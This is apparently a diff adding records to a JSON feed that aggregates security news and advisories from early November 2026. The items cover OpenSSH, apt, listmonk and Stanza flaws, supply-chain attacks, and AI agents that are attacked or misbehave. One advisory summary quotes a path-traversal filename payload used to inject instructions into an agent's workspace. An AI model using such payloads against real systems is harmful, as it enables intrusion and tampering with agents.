+    "other_sources": [],
+    "id": "b84cad2a2e67"
+  },
+  {
+    "title": "Hardening GitHub Actions Against Outside Threats",
+    "link": "https://socket.dev/blog/hardening-github-actions-against-outside-threats?utm_medium=feed",
+    "summary": "A practical guide to securing GitHub Actions against supply chain attacks, covering malicious pull requests, credential theft, dependency risks, and release pipelines.",
+    "published": "2026-11-03T17:41:44+00:00",
+    "source": "Socket Blog",
+    "category": "advisory",
+    "source_weight": 1.2,
+    "matched_keywords": [
+      "github",
+      "github actions",
+      "supply chain",
+      "credential"
+    ],
+    "score": 1.135162050491869,
+    "bm25": 0.894834949712059,
+    "severity": "high",
+    "cvss": 8.5,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "68736af426e3"
+  },
+  {
+    "title": "cPGuard Update Channel Hijacked to Backdoor Linux Servers and Collect Password Hashes",
+    "link": "https://thehackernews.com/2026/11/cpguard-update-channel-hijacked-to.html",
+    "summary": "An attacker broke into the update system of the cPGuard security tool on November 2 and used it to send a malicious script to customers' Linux servers. The script installed a backdoor and collected password hashes and other sensitive files from servers that ran it, cPGuard maker OPSSHIELD said in an advisory. In a later disclosure, OPSSHIELD said about 2,950 customer servers ran the script,",
+    "published": "2026-11-03T15:16:32+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "linux",
+      "backdoor"
+    ],
+    "score": 0.38676762077614996,
+    "bm25": 0.5226589469947973,
+    "severity": "high",
+    "cvss": 8.5,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "c3e615c4c5d6"
+  },
+  {
+    "title": "praktor: Path traversal in Telegram file uploads allows writing outside the agent workspace uploads/ directory (stored instruction injection)",
+    "link": "https://github.com/advisories/GHSA-48v2-6jcm-fc99",
+    "summary": "Affected: github.com/mtzanidakis/praktor. ### Impact A remote Telegram user can write files to arbitrary paths inside an agent's persistent workspace volume (`praktor-wk-<workspace>`, mounted at `/workspace/agent`), escaping the documented `uploads/` directory. The attacker controls the Telegram document filename, which was concatenated into the destination path without sanitization (`internal/telegram/bot.go`, at both upload sites) and resolved with `path.Join`, which collapses `../` sequences. A filename like `../../../CLAUDE.md` resolved to the root of the agent workspace volume, outside `uploads/`. Because the agent workspace i",
+    "published": "2026-11-03T17:27:25Z",
+    "source": "GHSA \u2014 go",
+    "category": "advisory",
+    "source_weight": 1.0,
+    "matched_keywords": [
+      "github"
+    ],
+    "score": 0.32779410259856373,
+    "bm25": 0.31518663711400363,
+    "severity": "high",
+    "cvss": 8.2,
+    "cves": [
+      "CVE-2026-62331"
+    ],
+    "packages": [
+      "github.com/mtzanidakis/praktor"
+    ],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "46c90b389886"
+  },
+  {
+    "title": "Stanza: RCE via pickle deserialization in the lemmatizer",
+    "link": "https://github.com/advisories/GHSA-gh9r-c94j-cmp5",
+    "summary": "Affected: stanza. ## TL;DR Loading an attacker-supplied lemma `.pt` runs arbitrary code as the loading user. Since 1.14.0 the lemmatizer stores `pos_dict` as a gzip-compressed pickle in the checkpoint's `dicts` field (a `bytes` value). `torch.load(weights_only=True)` treats `bytes` as a primitive and passes it through unexamined, so its allowlist never sees the inner stream. `Trainer.load` then feeds those bytes to an **unrestricted `pickle.loads`**: the only bare `pickle.loads` in the tree. Result: `weights_only=True` gives no protection here, and model loading executes code. Confirmed end-to-end against sta",
+    "published": "2026-11-03T20:29:16Z",
+    "source": "GHSA \u2014 pip",
+    "category": "advisory",
+    "source_weight": 1.0,
+    "matched_keywords": [
+      "checkpoint",
+      "rce",
+      "deserialization"
+    ],
+    "score": 0.15257142857142855,
+    "bm25": 0.05676255778253875,
+    "severity": "high",
+    "cvss": 7.8,
+    "cves": [
+      "CVE-2026-115878"
+    ],
+    "packages": [
+      "stanza"
+    ],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "f95850f9a991"
+  },
+  {
+    "title": "Attackers Target Unpatched CryptoPayment Gateway Flaw That Can Expose Wallet Credentials",
+    "link": "https://thehackernews.com/2026/11/attackers-target-unpatched.html",
+    "summary": "Threat actors are attempting to exploit an unpatched maximum-severity security vulnerability in the CryptoPayment Gateway WordPress plugin, according to findings from Defused Cyber. The vulnerability in question is CVE-2026-81648, which carries a CVSS score of 10.0. Successful exploitation of the flaw could permit unauthenticated users to delete arbitrary files on the server and extract",
+    "published": "2026-11-03T05:34:37+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "exploit",
+      "cve-",
+      "cvss"
+    ],
+    "score": 0.1252620576477521,
+    "bm25": 0.23196677342176317,
+    "severity": "high",
+    "cvss": 8.0,
+    "cves": [
+      "CVE-2026-81648"
+    ],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "d80473442c7a"
+  },
+  {
+    "title": "\u26a1 Weekly Recap: Critical CVEs, Linux DDoS Botnet, Device-Code Phishing, Android Spyware and More",
+    "link": "https://thehackernews.com/2026/11/weekly-recap-critical-cves-linux-ddos.html",
+    "summary": "Some attacks this week didn't need much of a trick. A fake support call, a trusted extension, a shared link, or a device with no password. Small things that people barely think about. Yet each was enough to cause serious trouble. Then there were the bigger messes. Billions stolen, hidden networks of hacked devices, poisoned software, and attackers finding new ways to turn normal tools against",
+    "published": "2026-11-02T16:57:56+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "linux"
+    ],
+    "score": 0.28812801551004275,
+    "bm25": 0.49252652223938925,
+    "severity": "critical",
+    "cvss": 9.5,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "a3562df3fff9"
+  },
+  {
+    "title": "SD JWT JS: Tampered disclosures silently dropped instead of rejected",
+    "link": "https://github.com/advisories/GHSA-f9j6-8p6x-r9j6",
+    "summary": "Affected: @sd-jwt/decode, @sd-jwt/core. ## Summary When one Disclosure in an SD-JWT presentation is tampered so its digest no longer matches the Issuer-signed `_sd` array, `@sd-jwt/decode` 0.19.0 does **not** reject the presentation. It silently drops the unmatched Disclosure and returns a **reduced claim set**, reporting success. The Issuer signature is untouched and valid. This is a downgrade/omission primitive. A malicious or curious **holder** can present a tampered Disclosure and have the relying party receive *fewer* claims than the credential carries, with no error surfaced. Where the relying party does **not** enforce key",
+    "published": "2026-11-02T17:54:39Z",
+    "source": "GHSA \u2014 npm",
+    "category": "advisory",
+    "source_weight": 1.0,
+    "matched_keywords": [
+      "jwt",
+      "credential"
+    ],
+    "score": 0.27466674841683564,
+    "bm25": 0.4005556747745519,
+    "severity": "high",
+    "cvss": 0.0,
+    "cves": [
+      "CVE-2026-62374"
+    ],
+    "packages": [
+      "@sd-jwt/decode",
+      "@sd-jwt/core"
+    ],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "195f8c630206"
+  },
+  {
+    "title": "Google Disrupts 1.3 Million-Device Android Botnet, Says TV Box Maker Sold Criminal Access",
+    "link": "https://thehackernews.com/2026/11/google-disrupts-13-million-device.html",
+    "summary": "A botnet of more than 1.3 million Android devices, mostly TV set-top boxes, lost control of its servers in late October in a takedown led by Google. Google says&nbsp;it is highly confident that device maker Videostrong intentionally put a backdoor in the boxes and sold access to criminals. They used the boxes for ad fraud and to pass other people's internet traffic through owners' home",
+    "published": "2026-11-02T15:50:26+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "backdoor"
+    ],
+    "score": 0.1427498697373116,
+    "bm25": 0.2572069724996605,
+    "severity": "high",
+    "cvss": 8.5,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "7a8b5fe3b630"
+  },
+  {
+    "title": "SonicWall warns of new SSL-VPN MFA bypass flaw exploited in attacks",
+    "link": "https://www.bleepingcomputer.com/news/security/sonicwall-warns-of-new-ssl-vpn-mfa-bypass-flaw-exploited-in-attacks/",
+    "summary": "SonicWall has released security updates to fix seven vulnerabilities in SonicOS firewalls, including an SSL-VPN authentication bypass flaw exploited in attacks. [...]",
+    "published": "2026-11-07T00:00:55+00:00",
+    "source": "BleepingComputer",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "mfa",
+      "ssl",
+      "vpn",
+      "sonicwall",
+      "authentication bypass"
+    ],
+    "score": 0.5366839491198836,
+    "bm25": 0.766691355885548,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "3851f16593ec"
+  },
+  {
+    "title": "Claude Code's \u201cDon't Ask Again\u201d File Exposes Passwords and Keys in 1,122 Public Copies on GitHub",
+    "link": "https://thehackernews.com/2026/11/claude-codes-dont-ask-again-file.html",
+    "summary": "Passwords and API keys that developers typed into commands they approved in Claude Code are sitting in public GitHub repositories, where anyone can read them. When a user selects \"Yes, and don't ask again,\" Anthropic's AI coding assistant can save the command, word-for-word, including the secret, in a project settings file. Software security company Apiiro said yesterday that 1,122 public",
+    "published": "2026-11-07T06:44:17+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "github"
+    ],
+    "score": 0.1495359000715509,
+    "bm25": 0.21362271438792987,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "9989e939e148"
+  },
+  {
+    "title": "Copilot code review: API management and review overview updates",
+    "link": "https://github.blog/changelog/2026-11-06-copilot-code-review-api-management-and-review-overview-updates",
+    "summary": "You can now manage GitHub Copilot code review settings through the REST and GraphQL APIs, from enterprise policy down to individual repositories. Copilot&#8217;s review overview comment is now more compact,&#8230; The post Copilot code review: API management and review overview updates appeared first on The GitHub Blog .",
+    "published": "2026-11-07T00:27:19+00:00",
+    "source": "GitHub Changelog",
+    "category": "build",
+    "source_weight": 0.3,
+    "matched_keywords": [
+      "github"
+    ],
+    "score": 0.07443026173292852,
+    "bm25": 0.2481008724430951,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "cc9249299f5d"
+  },
+  {
+    "title": "CVE-2026-123158 (*sshole): OpenSSH Password Authentication Bypass on Alpine Linux",
+    "link": "https://www.stepsecurity.io/blog/cve-2026-123158-sshhole-openssh-musl-password-bypass",
+    "summary": "CVE-2026-123158 (*sshole) enables an OpenSSH authentication bypass on Alpine Linux. Review lab results, exposure conditions, fixes, and mitigations.",
+    "published": "2026-11-06T22:30:16+00:00",
+    "source": "StepSecurity",
+    "category": "research",
+    "source_weight": 1.15,
+    "matched_keywords": [
+      "linux",
+      "alpine",
+      "openssh",
+      "authentication bypass",
+      "cve-"
+    ],
+    "score": 1.0427889352834436,
+    "bm25": 0.5125824343049852,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [
+      "CVE-2026-123158"
+    ],
+    "packages": [],
+    "corroboration": 3,
+    "other_sources": [
+      {
+        "source": "OX Security",
+        "link": "https://www.ox.security/blog/openssh-authentication-bypass-cve-2026-123158/",
+        "published": "2026-11-05T20:03:48+00:00",
+        "category": "research"
+      },
+      {
+        "source": "The Hacker News",
+        "link": "https://thehackernews.com/2026/11/hackers-exploited-openssh-sshole-flaw.html",
+        "published": "2026-11-06T15:21:49+00:00",
+        "category": "aggregator"
+      }
+    ],
+    "id": "2514ac7c2756"
+  },
+  {
+    "title": "listmonk: SQL Injection in `/api/subscribers/export` bypasses table access control, leaking admin password hashes and SMTP credentials",
+    "link": "https://github.com/advisories/GHSA-xgjr-7j9q-2h4r",
+    "summary": "Affected: github.com/knadh/listmonk. ### Summary A SQL injection vulnerability in `GET /api/subscribers/export` allows an authenticated user with the `subscribers:sql_query` permission to bypass the table access control that exists on the regular query endpoint (`GET /api/subscribers`) and read arbitrary tables from the database \u2014 including `users` (bcrypt password hashes) and `settings` (SMTP credentials, API keys). Both error-based and time-based exfiltration techniques are confirmed to work. This creates a privilege escalation path: `subscribers:sql_query` \u2192 hash exfiltration \u2192 offline bcrypt crack (cost factor 6) \u2192 Super Adm",
+    "published": "2026-11-06T18:15:17Z",
+    "source": "GHSA \u2014 go",
+    "category": "advisory",
+    "source_weight": 1.0,
+    "matched_keywords": [
+      "github",
+      "exfiltration",
+      "sql injection",
+      "privilege escalation"
+    ],
+    "score": 0.6194129446944191,
+    "bm25": 0.39962125464156073,
+    "severity": "medium",
+    "cvss": 5.5,
+    "cves": [
+      "CVE-2026-62361"
+    ],
+    "packages": [
+      "github.com/knadh/listmonk"
+    ],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "0b7ec0007cb3"
+  },
+  {
+    "title": "OpenSSH auth bypass bug hits Alpine Linux, OperWRT",
+    "link": "https://risky.biz/RBNEWS630/",
+    "summary": "An OpenSSH authentication bypass bug hits Alpine Linux and OpenWRT, hackers attempt to raise fridge temperatures at French blood banks, a French bank gets hacked for $133 million, and the Thai opposition has been targeted with spyware.",
+    "published": "2026-11-06T03:32:33+00:00",
+    "source": "Risky Business News",
+    "category": "aggregator",
+    "source_weight": 1.1,
+    "matched_keywords": [
+      "linux",
+      "alpine",
+      "openssh",
+      "authentication bypass"
+    ],
+    "score": 0.4005375097356001,
+    "bm25": 0.4248125103256364,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "dd4c22c2f2d1"
+  },
+  {
+    "title": "Chainalysis says breach exposed credentials for all customers",
+    "link": "https://www.bleepingcomputer.com/news/security/chainalysis-says-breach-exposed-credentials-for-all-customers/",
+    "summary": "Blockchain intelligence firm Chainalysis says a recent attack on its systems and internal tools has exposed credentials and live tokens for all customers. [...]",
+    "published": "2026-11-06T14:17:07+00:00",
+    "source": "BleepingComputer",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "breach"
+    ],
+    "score": 0.3714485244717744,
+    "bm25": 0.5306407492453921,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "68f16abad426"
+  },
+  {
+    "title": "Chainalysis Breach Exposes All Users' Credentials, Forces Shutdown of Key Services",
+    "link": "https://thehackernews.com/2026/11/chainalysis-breach-exposes-all-users.html",
+    "summary": "Blockchain analysis firm Chainalysis has revealed that its ongoing investigation into the agentic cyber attack targeting its systems also exposed names, usernames, password hashes and live tokens for all users. \"While we investigated, we removed access to Reactor and Data Solutions,\" the company said. \"At this time we continue to have no evidence that any investigations data has been accessed",
+    "published": "2026-11-06T08:04:49+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "breach"
+    ],
+    "score": 0.25609416031544546,
+    "bm25": 0.4268236005257424,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "a3b94f1fb170"
+  },
+  {
+    "title": "Runaway AI hacking agent behind WorkOS breach after escaping sandbox",
+    "link": "https://www.bleepingcomputer.com/news/security/runaway-ai-hacking-agent-behind-workos-breach-after-escaping-sandbox/",
+    "summary": "WorkOS says an AI-powered hacking agent that breached its internal sales application and accessed customer information was operated by a security researcher who claims the tool escaped its testing environment and unintentionally attacked the company. [...]",
+    "published": "2026-11-06T22:27:25+00:00",
+    "source": "BleepingComputer",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "breach"
+    ],
+    "score": 0.1654167596476908,
+    "bm25": 0.23630965663955827,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "246617fa609d"
+  },
+  {
+    "title": "10 Snyk Alternatives for Engineering & Security Teams (2027) | Endor Labs | Endor Labs",
+    "link": "https://www.endorlabs.com/learn/snyk-alternatives",
+    "summary": "Compare 10 Snyk alternatives for SCA, SAST and container scanning, with reachability, AI capabilities and fit by team size, build system and compliance needs.",
+    "published": "2026-11-06T04:40:51+00:00",
+    "source": "Endor Labs",
+    "category": "research",
+    "source_weight": 0.9,
+    "matched_keywords": [
+      "container",
+      "teams"
+    ],
+    "score": 0.13343604220535404,
+    "bm25": 0.1729726473032367,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "f7a8b948469a"
+  },
+  {
+    "title": "RUSTSEC-2026-0443: Vulnerability in actix-files",
+    "link": "https://rustsec.org/advisories/RUSTSEC-2026-0443.html",
+    "summary": "Hidden file disclosure through Windows short names",
+    "published": "2026-11-06T12:00:00+00:00",
+    "source": "RustSec",
+    "category": "advisory",
+    "source_weight": 1.0,
+    "matched_keywords": [
+      "windows"
+    ],
+    "score": 0.12339749240562274,
+    "bm25": 0.1439637411398932,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "04d5a32a6fbf"
+  },
+  {
+    "title": "@GitHub in Slack and Teams is generally available and more",
+    "link": "https://github.blog/changelog/2026-11-06-github-copilot-in-slack-and-teams-is-generally-available",
+    "summary": "Turn conversations into code with @GitHub in Slack and Teams! Investigate bugs, create issues, implement changes, and open pull requests&#8212;all without leaving your conversation. What&#8217;s new Build and review together&#8230; The post @GitHub in Slack and Teams is generally available and more appeared first on The GitHub Blog .",
+    "published": "2026-11-06T20:31:08+00:00",
+    "source": "GitHub Changelog",
+    "category": "build",
+    "source_weight": 0.3,
+    "matched_keywords": [
+      "github",
+      "slack",
+      "teams"
+    ],
+    "score": 0.08208812466769495,
+    "bm25": 0.27362708222564985,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "2b1caf305a69"
+  },
+  {
+    "title": "Usage metrics API adds code review details and addressed rate",
+    "link": "https://github.blog/changelog/2026-11-05-usage-metrics-api-adds-code-review-details-and-addressed-rate",
+    "summary": "The enterprise and organization repository-level Copilot usage metrics reports now show what happens to Copilot code review feedback. A new copilot_code_review object on each repos-1-day row reports how many Copilot-reviewed&#8230; The post Usage metrics API adds code review details and addressed rate appeared first on The GitHub Blog .",
+    "published": "2026-11-06T00:19:07+00:00",
+    "source": "GitHub Changelog",
+    "category": "build",
+    "source_weight": 0.3,
+    "matched_keywords": [
+      "github"
+    ],
+    "score": 0.07896502820858319,
+    "bm25": 0.3070862208111568,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "525555dfe497"
+  },
+  {
+    "title": "GitHub Copilot weekly releases \u2014 November 2",
+    "link": "https://github.blog/changelog/2026-11-06-github-copilot-weekly-releases-november-2",
+    "summary": "This week, Copilot comes to JetBrains Air and Xcode&#8217;s coding assistant, with updates to help you manage pull requests, settings, and agent sessions. GitHub Copilot app Set up Agent Merge&#8230; The post GitHub Copilot weekly releases \u2014 November 2 appeared first on The GitHub Blog .",
+    "published": "2026-11-06T21:00:26+00:00",
+    "source": "GitHub Changelog",
+    "category": "build",
+    "source_weight": 0.3,
+    "matched_keywords": [
+      "github"
+    ],
+    "score": 0.04536789414173217,
+    "bm25": 0.1512263138057739,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "353c4d26111c"
+  },
+  {
+    "title": "Copilot impact dashboard adds chat and VS Code agent usage",
+    "link": "https://github.blog/changelog/2026-11-06-copilot-impact-dashboard-adds-chat-and-vs-code-agent-usage",
+    "summary": "The Agent adoption chart in the Copilot impact dashboard now includes Copilot Chat and the VS Code Agents window, so you can see engagement across nine Copilot experiences. The adoption&#8230; The post Copilot impact dashboard adds chat and VS Code agent usage appeared first on The GitHub Blog .",
+    "published": "2026-11-06T22:17:28+00:00",
+    "source": "GitHub Changelog",
+    "category": "build",
+    "source_weight": 0.3,
+    "matched_keywords": [
+      "github"
+    ],
+    "score": 0.036665011927422816,
+    "bm25": 0.12221670642474274,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "a5fcc1255202"
+  },
+  {
+    "title": "GeoNode has Stored XSS in Documents metadata abstract field",
+    "link": "https://github.com/advisories/GHSA-r4hm-p9f9-fj9v",
+    "summary": "Affected: GeoNode. The abstract metadata of documents is not sanitised. It\u2019s possible to store arbitrary HTML (and JS) that will be executed when visiting the page.",
+    "published": "2026-11-06T19:50:34Z",
+    "source": "GHSA \u2014 pip",
+    "category": "advisory",
+    "source_weight": 1.0,
+    "matched_keywords": [
+      "xss"
+    ],
+    "score": 0.0163,
+    "bm25": 0.0,
+    "severity": "medium",
+    "cvss": 6.3,
+    "cves": [
+      "CVE-2026-55649"
+    ],
+    "packages": [
+      "GeoNode"
+    ],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "f6b05f16cb65"
+  },
+  {
+    "title": "OpenAI Launches GPT-6 Cyber After AI Helps Find 81 Firefox Flaws, 948 Linux Exploits",
+    "link": "https://thehackernews.com/2026/11/openai-launches-gpt-6-cyber-after-ai.html",
+    "summary": "OpenAI on Thursday unveiled GPT\u20116 Cyber, which it described as a major step forward in security research that brings together stronger cybersecurity capabilities with a step-change improvement in model alignment. The new model is \"more capable at finding and fixing vulnerabilities, and far more reliable staying within the boundaries researchers set,\" OpenAI said. It has classified the model as",
+    "published": "2026-11-06T14:58:32+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "linux",
+      "firefox"
+    ],
+    "score": 0.006999999999999999,
+    "bm25": 0.0,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "4ab15b935f3f"
+  },
+  {
+    "title": "The Flood is Coming And The Pipes Were Already Full",
+    "link": "https://thehackernews.com/2026/11/the-flood-is-coming-and-pipes-were.html",
+    "summary": "An update on Athena, and some unsolicited predictions on what's coming next On Saturday, Dario Amodei published We Must Pace the Frontier. I agree with him. Go read it if you haven't. I've spent the summer looking at what these models find, and the gap he describes between what they can do and what the rest of us are ready for is the one I've been staring at since May. The hardest piece of his",
+    "published": "2026-11-06T11:30:00+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "go "
+    ],
+    "score": 0.006,
+    "bm25": 0.0,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "be398781c151"
+  },
+  {
+    "title": "Usage metrics API flags telemetry and version gaps",
+    "link": "https://github.blog/changelog/2026-11-05-usage-metrics-api-flags-telemetry-and-version-gaps",
+    "summary": "The Copilot usage metrics API now shows which users are missing client telemetry or are running IDE or extension versions below the usage metrics minimums. New per-user fields appear in&#8230; The post Usage metrics API flags telemetry and version gaps appeared first on The GitHub Blog .",
+    "published": "2026-11-06T00:08:31+00:00",
+    "source": "GitHub Changelog",
+    "category": "build",
+    "source_weight": 0.3,
+    "matched_keywords": [
+      "github"
+    ],
+    "score": 0.0025714285714285713,
+    "bm25": 0.0770494990964289,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "0778fb85d915"
+  },
+  {
+    "title": "Researchers Bypass ChatGPT Lockdown Mode to Exfiltrate Chats Without User Interaction",
+    "link": "https://thehackernews.com/2026/11/researchers-bypass-chatgpt-lockdown.html",
+    "summary": "Cybersecurity researchers have disclosed details of a now-patched vulnerability that could be exploited to bypass Lockdown Mode protections in OpenAI ChatGPT. Lockdown Mode was introduced by the artificial intelligence (AI) company in June 2026 as an optional setting to minimize data exfiltration risks arising from prompt injections. \"The flaw could enable silent chat data theft, phishing,",
+    "published": "2026-11-05T16:42:32+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "exfiltration"
+    ],
+    "score": 0.33440388213265215,
+    "bm25": 0.5573398035544203,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "dd9d10ec6193"
+  },
+  {
+    "title": "GitHub to Block pull_request_target Workflows by Default Starting December 2",
+    "link": "https://socket.dev/blog/github-to-block-pull-request-target?utm_medium=feed",
+    "summary": "GitHub is tightening GitHub Actions security with new restrictions on privileged pull request workflows. Here's what changes and how maintainers are affected.",
+    "published": "2026-11-05T15:01:39+00:00",
+    "source": "Socket Blog",
+    "category": "advisory",
+    "source_weight": 1.2,
+    "matched_keywords": [
+      "github",
+      "github actions"
+    ],
+    "score": 0.3243390369983744,
+    "bm25": 0.3153296193039751,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "89cbfc49215e"
+  },
+  {
+    "title": "OpenAI AI Pipeline Generates 948 Linux Root Escalation Exploits in 30-Hour Run",
+    "link": "https://thehackernews.com/2026/11/openai-ai-pipeline-generates-948-linux.html",
+    "summary": "OpenAI on Wednesday detailed a pipeline that employed an upcoming cyber-focused artificial intelligence (AI) model to validate and patch 948 local privilege escalation vulnerabilities in Linux for $1.2 million in API costs. \"Our prototype identified and analyzed 2,308 candidate Linux kernel findings, dynamically reproduced 1,724 vulnerabilities, and produced 948 local privilege escalation (LPE)",
+    "published": "2026-11-05T12:08:54+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "linux",
+      "kernel",
+      "privilege escalation"
+    ],
+    "score": 0.3085840254182021,
+    "bm25": 0.6171680508364042,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "c7e59b0d4684"
+  },
+  {
+    "title": "[tl;dr sec] #353 - A Thousand Fewer Paths to Root, Kubernetes Security Logging, Post-AI Security Floor",
+    "link": "https://tldrsec.com/p/tldr-sec-353",
+    "summary": "OpenAI's pipeline found 948 LPEs in Linux, how to build a comprehensive security logging platform for k8s clusters, 3 security priorities in a world with powerful AI",
+    "published": "2026-11-05T15:30:00+00:00",
+    "source": "tl;dr sec",
+    "category": "aggregator",
+    "source_weight": 1.0,
+    "matched_keywords": [
+      "kubernetes",
+      "k8s",
+      "linux"
+    ],
+    "score": 0.303920105220947,
+    "bm25": 0.3545734560911048,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "0c4aa332b19f"
+  },
+  {
+    "title": "OpenSSH flaw lets attackers log into password-disabled Linux accounts",
+    "link": "https://www.bleepingcomputer.com/news/security/openssh-flaw-lets-attackers-log-into-password-disabled-linux-accounts/",
+    "summary": "A newly disclosed OpenSSH vulnerability dubbed \"*sshole\" allows attackers to log in to certain Alpine Linux and other musl-based Linux accounts that are configured to block password authentication, simply by entering an oversized password. [...]",
+    "published": "2026-11-05T17:45:29+00:00",
+    "source": "BleepingComputer",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "linux",
+      "alpine",
+      "musl",
+      "openssh"
+    ],
+    "score": 0.2521226996715456,
+    "bm25": 0.42020449945257604,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "0104ffe0a06b"
+  },
+  {
+    "title": "CVE-2026-109518: apt Flaw Lets Attackers Swap Packages After Verification and Run Code as Root",
+    "link": "https://www.stepsecurity.io/blog/cve-2026-109518-apt-package-swap-root",
+    "summary": "Understand CVE-2026-109518, patch vulnerable APT clients, and use Harden-Runner to find HTTP package downloads and investigate CI/CD activity.",
+    "published": "2026-11-05T11:49:11+00:00",
+    "source": "StepSecurity",
+    "category": "research",
+    "source_weight": 1.15,
+    "matched_keywords": [
+      "ci/cd",
+      "runner",
+      "cve-"
+    ],
+    "score": 0.18958770548336856,
+    "bm25": 0.2308024240667096,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [
+      "CVE-2026-109518"
+    ],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "5bba5f3034a5"
+  },
+  {
+    "title": "RUSTSEC-2026-0437: Vulnerability in azure_security_keyvault_certificates",
+    "link": "https://rustsec.org/advisories/RUSTSEC-2026-0437.html",
+    "summary": "Rejected authentication challenges can poison the Key Vault scope cache",
+    "published": "2026-11-05T12:00:00+00:00",
+    "source": "RustSec",
+    "category": "advisory",
+    "source_weight": 1.0,
+    "matched_keywords": [
+      "key vault"
+    ],
+    "score": 0.1023379407143593,
+    "bm25": 0.143273117000103,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "632a135d71ea"
+  },
+  {
+    "title": "RUSTSEC-2026-0438: Vulnerability in azure_security_keyvault_secrets",
+    "link": "https://rustsec.org/advisories/RUSTSEC-2026-0438.html",
+    "summary": "Rejected authentication challenges can poison the Key Vault scope cache",
+    "published": "2026-11-05T12:00:00+00:00",
+    "source": "RustSec",
+    "category": "advisory",
+    "source_weight": 1.0,
+    "matched_keywords": [
+      "key vault"
+    ],
+    "score": 0.1023379407143593,
+    "bm25": 0.143273117000103,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
